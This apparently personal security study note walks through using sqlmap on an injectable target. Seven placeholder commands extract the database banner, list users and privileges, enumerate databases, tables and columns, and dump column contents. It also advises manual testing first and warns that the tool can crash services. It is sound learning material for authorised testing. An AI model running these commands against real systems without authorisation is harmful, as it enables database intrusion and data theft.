---
date: '2023-06-04T18:10:11+0900'
---

# Information Gathering with sqlmap

**Step 0:** Test injection by hand first.

This is good practice to horn someone own skill.

Plus, `sqlmap` is just a tool and could use a very inefficient exploitation strategy if going fully automatic without prior manual testing.
In addition, `sqlmap` is a dangerous tool that could crash the remote service if not used correctly.

**Step 1:** Extract the database banner

``` {.sh}
sqlmap -u <target> --banner <other_options>
```

**Step 2:** List users of the database

``` {.sh}
sqlmap -u <target> --users <other_options>
```

**Step 3:** Check if database user is administrator

``` {.sh}
sqlmap -u <target> --is-dba <other_options>
```

**Step 4:** List available databases

``` {.sh}
sqlmap -u <target> --dbs <other_options>
```

**Step 5:** List tables of selected database

``` {.sh}
sqlmap -u <target> -D <database> --tables <other_options>
```

**Step 6:** List columns of one or more tables

``` {.sh}
sqlmap -u <target> -D <database> -T <table,table> --columns <other_options>
```

**Step 7:** Dump columns

``` {.sh}
sqlmap -u <target> -D <database> -T <table> -C <column,column> --dump <other_options>
```
